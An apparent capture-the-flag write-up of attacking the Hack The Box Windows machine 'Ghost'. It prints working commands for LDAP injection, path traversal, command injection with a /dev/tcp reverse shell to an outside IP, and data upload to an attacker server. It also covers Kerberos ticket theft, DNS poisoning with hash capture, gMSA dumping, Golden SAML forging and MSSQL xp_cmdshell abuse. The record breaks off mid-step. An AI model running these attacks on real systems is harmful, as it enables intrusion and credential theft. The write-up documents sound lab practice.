<div class="htb-box-info insane">
  <div class="box-header">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cc-c872-47f7-acd9-36ddbdf0eab8.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Windows</td></tr>
        <tr><td>Difficulty:</td><td>Medium</td></tr>
        <tr><td>Release:</td><td>13 Jul 2024</td></tr>
      </table>
    </div>
  </div>
</div>



# SCANNING
```bash
nmap -v -p- --open --min-rate 1000 10.129.231.105
```

output:
```bash
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8008/tcp  open  http
8443/tcp  open  https-alt
9389/tcp  open  adws
49443/tcp open  unknown
49469/tcp open  unknown
49664/tcp open  unknown
49669/tcp open  unknown
49677/tcp open  unknown
62173/tcp open  unknown
62319/tcp open  unknown
```

Default AD ports. Here most interesting is http and https services... mssql service, 8008 unknown port and 8443.

let's run nmap for service enumeration:
```bash
sudo nmap -v -sV -sC -p 53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389 -oN open_ports_scan 10.129.231.105
```

we it is:
```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-16 08:15:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Issuer: commonName=DC01.ghost.htb
<SNIP>
8028 fc3f 444b 8d68
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
<SNIP>
8028 fc3f 444b 8d68
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; <SNIP>
| ms-sql-ntlm-info: 
|   10.129.231.105:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
<SNIP>
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <SNIP>
8028 fc3f 444b 8d68
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <SNIP>
8028 fc3f 444b 8d68
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
<SNIP>
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8008/tcp open  http          nginx 1.18.0 (Ubuntu)
|_http-generator: Ghost 5.78
|_http-title: Ghost
|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
| http-title: Ghost Core
|_Requested resource was /login
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Issuer: commonName=core.ghost.htb
<SNIP>
9389/tcp open  mc-nmf        .NET Message Framing
<SNIP>
```

add this to `/etc/hosts`:
```bash
10.129.231.105 ghost.htb DC01.ghost.htb core.ghost.htb DC01
```

Nmap showed that on port 8008 running linux..? 

udp scan:
```bash
sudo nmap -sU --min-rate 1000 10.129.231.105
```

nothing interesting
```bash
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap
```


# WEB
### port 80
![[Pasted image 20261016113509.png]]

I tried enum for directories and vhosts but no use... 
### port 443
-> cant even connect...

### port 8008
We got something here. Here is the main page:
![[Pasted image 20261016112759.png]]

some article
![[Pasted image 20261016112811.png]]

powered by
![[Pasted image 20261016112823.png]]
nmap found version - `Ghost 5.78`

endpoint - `/ghost/` is login page.
![[Pasted image 20261016112845.png]]

also there is robots.txt in place:
![[Pasted image 20261016121101.png]]

directory enumeration
```bash
feroxbuster -u 'http://ghost.htb:8008/' -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```
-> showed nothing interesting...

vhost enum
```bash
ffuf -u 'http://ghost.htb:8008' -H "Host: FUZZ.ghost.htb" -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 7676
```
found new subdomain -> `intranet`


Also found Ghost Arbitrary File Read Exploit (CVE-2023-40028) -> but it's require admin access. skip for now. will be last resort... now let's take a look at new vhost.

### intranet.ghost.htb
first page
![[Pasted image 20261016114133.png]]
looks like Next.JS application based on wappalyzer.

dir enum:
```bash
feroxbuster -u 'http://intranet.ghost.htb:8008/' -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```
nothing interesting, looks like we have to login first:
```
307      GET        1l       52w     4715c http://intranet.ghost.htb:8008/forum => http://intranet.ghost.htb:8008/login
307      GET        1l       52w     4712c http://intranet.ghost.htb:8008/news => http://intranet.ghost.htb:8008/login
307      GET        1l       52w     4715c http://intranet.ghost.htb:8008/users => http://intranet.ghost.htb:8008/login
307      GET        1l       52w     4724c http://intranet.ghost.htb:8008/profile => http://intranet.ghost.htb:8008/login
```

## Ldap Injection

intercepted login request
![[Pasted image 20261016121556.png]]
Interesting... LDAP is used for auth... I can try ldap injection here... 

I will test with simples ldap injection payload:
```
username: *
secret: *
```

I got in !

First page:
![[Pasted image 20261016123147.png]]

There is some text about migration:
![[Pasted image 20261016125956.png]]

Users page.
![[Pasted image 20261016123331.png]]

forum page:
![[Pasted image 20261016123548.png]]


### port 8443
redirect to /login/ endpoint
![[Pasted image 20261016113105.png]]

when push to the button:
```bash
https://federation.ghost.htb/adfs/ls/?SAMLRequest=nVNNj5swEP0ryPfwDSVWyColh0batiihPfRSGTPZIBmbeobd9N9XkNDNoc0hV7%2BZN2%2FePK%2Bezp1yXsFia3TOAtdnT%2BsVik71fDPQSe%2Fh1wBIzrlTGvkE5GywmhuBLXItOkBOkh82n5956Pq8t4aMNIo5u23Ofh7rLJVJGiVJBMtA1mlcy2UsAJo4iZZ%2BUEOSiixNmfN9FhG6PnN2iAPsNJLQlLPQD9NF4C%2BCtPIzHgXc%2F%2BCGWfSDOeV13MdWN61%2Bua%2BtvhQh%2F1RV5aL8eqiYswWkVguaRp%2BIeuSed4QG7PTmvpwMknui2hPNET2FHnM2iGBHtDAahw7sAexrK%2BHb%2FvmdQxoL7908i%2BPoQjGa6PUGaQ%2FYG43ALo7zaWd7Y%2FX9bcSsgq3vzFx5N9zzab%2BIDnbb0qhW%2Fn7ktBulzFthQRDkjOwAzJupr4GBZopPYTTB%2BaH4FKbrhW1xvAuchaTZplviQgnEPRwfMe1umeRypAbkpUB8M7YZkwaSoKms0NgbS1dr%2F6VnfcH%2BY8df9PaLrf8A&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=UiT%2FmbUQ3QilFg3Uk8zFp7%2BLM4NlOLToSCmW7D5105pcaZeS8j8XP3mVbiW0RS6ylkhRxhB4glb63ulr5Gt3fPwMA%2Bz5%2BOjU2Y8m3BOV5xEoy3c%2BWdmeKyVnB5AaSuHBZq%2BMsh1HuvDMBa1kkKBytvXZA3LSRcrkRS862rqS37ZlOyP6I6EoTc4s5Y6y%2Bz%2BQRSJFS9OXw5ZcNgJIOF9y9oteYwBkGLTcEj2g0Ev3mxCnbqUMPi6%2B6BxDG0YrPwmevDFly2S2LTPpZqsGt1tAfMtgdPI%2B0LQeR2ILxLTpunR7rdRw7M%2BphQFyiyKDLbjzrjWrUpxdDSC6zk8lhoDJRg%3D%3D
```
new vhost -> `federation`

### federation.ghost.htb
we got some login page
![[Pasted image 20261016114418.png]]

Made by microsoft so i think it's pointless ( for now ) to test some sql, ldap injections idk...


## DNS enum
```bash
dig any ghost.htb @10.129.231.105
```

noting here
```bash
;; ANSWER SECTION:
ghost.htb.              600     IN      A       10.0.0.254
ghost.htb.              3600    IN      A       127.0.0.1
ghost.htb.              600     IN      A       10.129.231.105
ghost.htb.              3600    IN      NS      dc01.ghost.htb.
ghost.htb.              3600    IN      SOA     dc01.ghost.htb. hostmaster.ghost.htb. 260 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.ghost.htb.         3600    IN      A       10.0.0.254
dc01.ghost.htb.         3600    IN      A       10.129.231.105
```

and here. 
![[Pasted image 20261016125613.png]]

there is gitea but no bitbucket... added to `/etc/hosts`.
![[Pasted image 20261016125722.png]]


### gitea.ghost.htb
![[Pasted image 20261016125855.png]]

## Password fuzz

In intraned first page I saw this message:
![[Pasted image 20261016125956.png]]

so we have to get `gitea_temp_principal` password/token

I have an idea to fuzz... I will be doing it from burp intruder.... ( по-хорошему надо бы написать скрипт для этого, но я решил сделать это так... )

![[Pasted image 20261016132036.png]]


paste all chars ( small ) + numbers + symbols
![[Pasted image 20261016132548.png]]


payload looks like this and i will just add new found char to the payload... Yea it's slow... but wcyd...
```bash
$$*
s$$*
sz$$*
szr$$*
szrr$$*
szrr8$$*
szrr8k$$*
szrr8kp$$*
szrr8kpc$$*
szrr8kpc3$$*
szrr8kpc3z$$*
szrr8kpc3z6$$*
szrr8kpc3z6o$$*
szrr8kpc3z6on$$*
szrr8kpc3z6onl$$*
szrr8kpc3z6onlq$$*
szrr8kpc3z6onlqf$$* -> stopped on this
```

## Repositories enumeration

So we have found our first creds: `gitea_temp_principal`:`szrr8kpc3z6onlqf`

And we got in !
![[Pasted image 20261016133252.png]]

we can switch to new user:
![[Pasted image 20261016155634.png]]

Now I need to look for something interesting in this repos...

On repo `ghost-dev/blod` there is this `README.md`:
```
Our blog uses the Ghost CMS in a Docker container.

We are planning on adding additional features to the blog. One of them is a new connection to the intranet. For example, some posts will be featured on our intranet, or URLs from posts will be scanned by the intranet. However, this is still in development, so some features are behind an API key, shared between the intranet and the blog. It is named `DEV_INTRANET_KEY` and it is stored as an environment variable.

We modified a bit of the Ghost CMS source code to accomodate such new features. One example is the `posts-public.js` file, which allows us to extract additional information about the posts. In the future we should move the information to the database so that we don't accidentally lose data on container recreation. Make sure to replace the file when running, or just use the provided Dockerfile.

Also, the public API in Ghost needs an API key. We can write it here since it only allows access to public data: `a5af628828958c976a3b6cc81a`
```
interesting lead. I think it will be helpfull later...

#### gohst-dev/intranet enumeration
There is nothing much I found interesting in here. so I switched to private intranet repository. 

![[Pasted image 20261016161433.png]]
In `README.md` we can see new endpoint `http://intranet.ghost.htb/api-dev`. 

This is at `backend/src/api/dev/scan.rs`.. user input without any sanitization or validation pasted into bash pipe... I need to find out how to make a request to this endpoint...
![[Pasted image 20261016161149.png]]

So I need some api key for this shit to interact...
![[Pasted image 20261016161917.png]]


## API abuse

so with this key `a5af628828958c976a3b6cc81a` I can access some new blog features from `http://ghost.htb:8008`. There is an api endpoint found from enum..

looking at the `posts-public.js` there is this interesting param:
```js
        permissions: true,
        async query(frame) {
            const options = {
                ...frame.options,
                mongoTransformer: rejectPrivateFieldsTransformer
            };
            const posts = await postsService.browsePosts(options);
            const extra = frame.original.query?.extra;
            if (extra) {
                const fs = require("fs");
                if (fs.existsSync(extra)) {
                    const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
                    posts.meta.extra = { [extra]: fileContent };
                }
            }
            return posts;
        }
    },
```

Browsing ghost cms docs (https://docs.ghost.org/content-api/posts), I found out how to interact with it.

example of this harmless curl:
```bash
curl "https://demo.ghost.io/ghost/api/content/posts/?key=22444f78447824223cefc48062&include=tags,authors"
```

we can extract additional data from posts:
![[Pasted image 20261016171511.png]]

But what if I add this extra param pointing to some file?

And I got `/etc/passwd`!
```js
...SNIP...
    "extra": {
      "../../../../../etc/passwd": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"
    }
  }
}
```

And now I can pull `/proc/self/environ` ( because as we saw before this `DEV_INTRANET_KEY` pulls out from environment variable ) file to get private api key ( I made output a bit readable )
```bash
HOSTNAME=26ae7990f3dd
database__debug=false
YARN_VERSION=1.22.19
PWD=/var/lib/ghost
NODE_ENV=production
database__connection__filename=content/data/ghost.db
HOME=/home/node
database__client=sqlite3
url=http://ghost.htb
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
database__useNullAsDefault=true
GHOST_CONTENT=/var/lib/ghost/content
SHLVL=0
GHOST_CLI_VERSION=1.25.3
GHOST_INSTALL=/var/lib/ghost
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_VERSION=18.19.0
GHOST_VERSION=5.78.0
```
and here it is! now i can interact with `/scan` endpoing

The code of `/scan` endpoint looks like this:
```rust
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();
```
So our commands is send to bash pipeline. So I have to put into url some command to test. but first we have to escape intranet_url_check command. We can do it for exaple using `;` or `||`.

let's craft curl command:
```bash
curl -sk -X POST http://intranet.ghost.htb:8008/api-dev/scan -H "Content-Type: application/json" -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -d '{"url":"|| id"}' | jq .
```

it worked !!
```js
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}
```

I want to get a shell now. 

Let's write basic rev shell payload in:
```bash
curl -sk -X POST http://intranet.ghost.htb:8008/api-dev/scan -H "Content-Type: application/json" -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -d '{"url":"; /bin/bash -i >& /dev/tcp/10.10.15.149/9001 0>&1"}'
```


got in and upgraded tty shell:
![[Pasted image 20261016175143.png]]

So we inside docker container....

There is `database.sqlite` file and I want it. There is no `nc` so download it this way:

start upload server on our host:
```bash
python3 -m uploadserver 8000
```

and 
```bash
curl -X POST http://10.10.15.149:8000/upload -F 'files=@database.sqlite'
```

there is nothing interesting...
![[Pasted image 20261016180920.png]]

there is windows host shown in `/etc/hosts`:
![[Pasted image 20261016181155.png]]

inside `/root/.ssh` some interesting files:
![[Pasted image 20261016181318.png]]

We can ssh in because we are root:
```bash
ssh -S "controlmaster/florence.ramirez@ghost.htb@dev-workstation:22" florence.ramirez@dev-workstation
```

We got into new host or workstation or how to call it:
![[Pasted image 20261016182310.png]]

Looking at `/etc/hosts` from this domain showed this:
```bash
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.0.0.254      windows-host dc01.ghost.htb ghost.htb
172.18.0.2      LINUX-DEV-WS01
```

This is still docker container...

# PRIVILEGE ESCALATION
## Ticket extraction

So I think this machine is domain joined so let's enum in that direction:
```bash
klist
```

and we got ticket in memory:
```bash
Ticket cache: FILE:/tmp/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB

Valid starting     Expires            Service principal
10/17/26 13:26:02  10/17/26 23:26:02  krbtgt/GHOST.HTB@GHOST.HTB
        renew until 10/18/26 13:26:01
```

`krb5.conf`:
```bash
[logging]
    default = FILE:/var/log/krb5.log
    kdc = FILE:/var/log/kdc.log
    admin_server = FILE:/var/log/kadmind.log

[libdefaults]
    default_realm = GHOST.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    GHOST.HTB = {
        kdc = dc01.ghost.htb
        admin_server = dc01.ghost.htb
        default_domain = GHOST.HTB
    }
    ghost.htb = {
        kdc = dc01.ghost.htb
        admin_server = dc01.ghost.htb
        default_domain = ghost.htb
    }
    GHOST = {
        kdc = dc01.ghost.htb
        admin_server = dc01.ghost.htb
        default_domain = GHOST.HTB
    }

[domain_realm]
    .ghost.htb = GHOST.HTB
    ghost.htb = GHOST.HTB
```

In env I found directory of the ticket. Let's forward it to our system by encoding to base64.
```bash
base64 -w 0 krb5cc_50
```

We get big base64 blob
```
BQQAD...SNIP...Jw4MAAAAA
```

On our host decrypt it and save into ccache file
```bash
echo "base_64_blob"| base64 -d > florence.ramirez.ccache
```
Then export it

And install if u dont have ( optional ) .
```bash
sudo apt-get install krb5-user
klist
```

All good..
![[Pasted image 20261017165546.png]]

check connection:
```bash
netexec smb DC01.ghost.htb --use-kcache
```
-> [ + ]

Request krb5.conf file so ther wont be any troubles with kerberos... 
```bash
netexec smb DC01.ghost.htb --use-kcache --generate-krb5-file ghost.krb
sudo cp ghost.krb /etc/krb5.conf
```

Now I can start enumeration this shit....
```bash
netexec smb DC01.ghost.htb --use-kcache --shares
```
![[Pasted image 20261017170103.png]]

Lets enum to what we have access:
* ldap -> +
* mssql -> -
* winrm -> -

ok. let's download shares:
```bash
netexec smb DC01.ghost.htb --use-kcache --shares -M spider_plus -o DOWNLOAD_FLAG=True -o OUTPUT_FOLDER="$(pwd)"
```
-> Nothing here. In Users just some junk...

Let's run rusthound:
```bash
rusthound-ce --domain ghost.htb -f dc01.ghost.htb -z -k -c All
```

Add our user to owned:
![[Pasted image 20261017172713.png]]

let's search for something we can grab on

Bloodhound found some forest trust. save it for later.. looks like Parent <-> child forest trust.
![[Pasted image 20261017172825.png]]

Found kerberoastable user:
![[Pasted image 20261017172929.png]]

but I am having some issues... Isn't working...

have to dig other way...

Using netexec everything woked:
```bash
netexec ldap DC01.ghost.htb --use-kcache --kerberoasting 'adfs_gmsa$'
```

got hash:
```
$krb5tgs$18$hostadfs_gmsa.ghost.htb$GHOST.HTB$*ghost.htb\adfs_gmsa$*$b8d298214490...SNIP...
```

```bash
hashcat hash -m 19700 /usr/share/wordlists/rockyou.txt
```

not cracked... ( I forgot that this is service account and their hashes hard to crack or even uncrackable because of password rotation if I remeber it well... )

## NTLM Relay

So we have to find other route. I look up to relay attacks
```bash
netexec smb DC01.ghost.htb --use-kcache --gen-relay-list relay.txt
```
-> nothing ...

I remembered about this message:
![[Pasted image 20261017182027.png]]

let's try to create a dns record, because typically any domain user can create DNS entries that don’t exist. ( -g means to use ccache file... )
```bash
nsupdate -g
> server dc01.ghost.htb
> zone ghost.htb
> update add bitbucket.ghost.htb 3600 A 10.10.15.149
> send
> quit
```

It's resolves as our IP !
```bash
dig @10.129.231.105 bitbucket.ghost.htb +short
-> 10.10.15.149
```

Now run responder as root:
```bash
sudo responder -I tun1 -v
```

And we got `justin.bradley`'s hash !
```bash
justin.bradley::ghost:b0d316eabd319c96:3F707840E1015335D79390DEB631CBFE:01010000000000004A1C5E724C5EDD01196BA59F1544962D00000000020008004F0057004700460001001E00570049004E002D0034004E0054004300320057004A004A004D0046004400040014004F005700470046002E004C004F00430041004C0003003400570049004E002D0034004E0054004300320057004A004A004D00460044002E004F005700470046002E004C004F00430041004C00050014004F005700470046002E004C004F00430041004C000800300030000000000000000000000000400000B85D19B508DD0FEAF96DB5118146FB431CDBEEF5D744950FEE513939FE135AC00A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000
```

Let's crack it
```bash
hashcat hash2 -m 5600 /usr/share/wordlists/rockyou.txt
```

And we got our first domain creds!!!

Here it is `justin.bradley`:`Qwertyuiop1234$$`

just to test:
```bash
netexec winrm ghost.htb -u 'justin.bradley' -p 'Qwertyuiop1234$$'
```
-> [ + ] We have winrm access!

So let's winrm in:
```bash
evil-winrm -i ghost.htb -u 'justin.bradley' -p 'Qwertyuiop1234$$'
```
![[Pasted image 20261017184918.png]]
and we got our first flag!!! 

There is nothing in home directory..
```powershell
*Evil-WinRM* PS C:\Users\justin.bradley> tree /f
Folder PATH listing
Volume serial number is 2804-C13F
C:.
+---Desktop
¦       user.txt
¦
+---Documents
¦   +---WindowsPowerShell
¦           Microsoft.PowerShell_profile.ps1
¦
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

Ok. Let's get back to our bloodhound

## ReadGMSAPassword abuse

interesting...
![[Pasted image 20261017185226.png]]

%% благо есть такой инструмент как netexec: %%

we can read gMSA passwords:
```bash
netexec ldap ghost.htb -u 'justin.bradley' -p 'Qwertyuiop1234$$' --gmsa
```

Here his ntlm hash:
```bash
Account: adfs_gmsa$           NTLM: e37b1566705cd4b67015d20859ffd2ac     PrincipalsAllowedToReadPassword: ['DC01$', 'justin.bradley']
```

got `adfs_gmsa$`:`e37b1566705cd4b67015d20859ffd2ac`

we can winrm in cause I saw folder with this user and he is in RMU group
```bash
evil-winrm -i dc01.ghost.htb -u 'adfs_gmsa$' -H 'e37b1566705cd4b67015d20859ffd2ac'
```

now what??

Then I remebered about `federation.ghost.htb` domain: tried to auth as justin got this:
![[Pasted image 20261017190038.png]]

we have access to mssql:
```bash
netexec mssql ghost.htb -u 'justin.bradley' -p 'Qwertyuiop1234$$'
```
-> [ + ]

Let's auth:
```bash
mssqlclient.py 'ghost.htb/justin.bradley:Qwertyuiop1234$$@10.129.231.105' -windows-auth
```

nothing interesting
![[Pasted image 20261017190528.png]]

till I got to this part ( There is linked server ):
![[Pasted image 20261017190547.png]]

but no use...
```bash
> use_link [PRIMARY]
ERROR(PRIMARY): Line 1: Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'.
```

## ADFS abuse or Golden SAML attack

In this moment I was stuck. Then i  found this guide for our next attack - https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/golden-saml-attack/. In short: the attack is called `Golden SAML` and it's targeting AD FS. First we need dump some private keys and then we can forge `SAMLRespone` message. And with that auth as administrator for example.

First download tool [from here](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/ADFSDump.exe) and upload it to ghost:
```bash
iwr http://10.10.15.149/ADFSDump.exe -OutFile ADFSDump.exe
./ADFSDump.exe
```

Running it dumps all the ADFS material:
![[Pasted image 20261018075546.png]]
![[Pasted image 20261018075600.png]]

After some time fucking with this tool dependencies I finally ran it:
![[Pasted image 20261018083536.png]]

Now we need to craft command:
![[Pasted image 20261018084850.png]]
Here is arguments for saml2 module.

Now we can run it:
```bash
python3 ADFSpoof.py -b encrypted_token_siging_key.bin private_key.bin -s core.ghost.htb saml2 --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' --nameid 'Administrator@ghost.htb' --rpidentifier 'https://core.ghost.htb:8443' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
```

And we get our SAMLResponse output:
```
PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfMU9MUDNRIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0i
...SNIP...
LjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D
```

Now we need to auth into `federation.ghost.htb` as justin, intercept all requests with burp proxy and change this `SAMLResponse` value to one that we forged:
![[Pasted image 20261018084653.png]]

## MSSQL  abuse

And we got in !
![[Pasted image 20261018084707.png]]

This page seems to be an overlay to run queries in the database. In the text there’s a new domain, `corp.ghost.htb`.

So let's work with this:
```sql
SELECT SYSTEM_USER; 
```
-> we are `web_client` in database.

Now I want to check for linked servers:
```sql
SELECT srvname, isremote FROM sysservers
```
![[Pasted image 20261018100344.png]]

On that server I am new user:
```sql
SELECT * FROM openquery("PRIMARY", 'select system_user');
```
-> `bridge_corp`

Command execution is still prohibited:
```sql
EXEC ('xp_cmdshell ''whoami''') AT [PRIMARY];
```
-> RequestError: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.

Check who we can impersonate on PRIMARY server:
```sql
EXECUTE ('SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE''') AT [PRIMARY];
```

And we got it!
![[Pasted image 20261018100726.png]]
We can impersonate system administrator! 

Now run this to enable command execution and test with `whoami` command:
```sql
EXECUTE ('EXECUTE AS LOGIN = ''sa''; EXEC SP_CONFIGURE ''show advanced options'', 1; RECONFIGURE; EXEC SP_CONFIGURE ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [PRIMARY];
```
-> `nt service\\mssqlserver`

Let's get a reverse shell. Generate first. PowerShell base64 payload. 
![[Pasted image 20261018101526.png]]

Now run it:
```sql
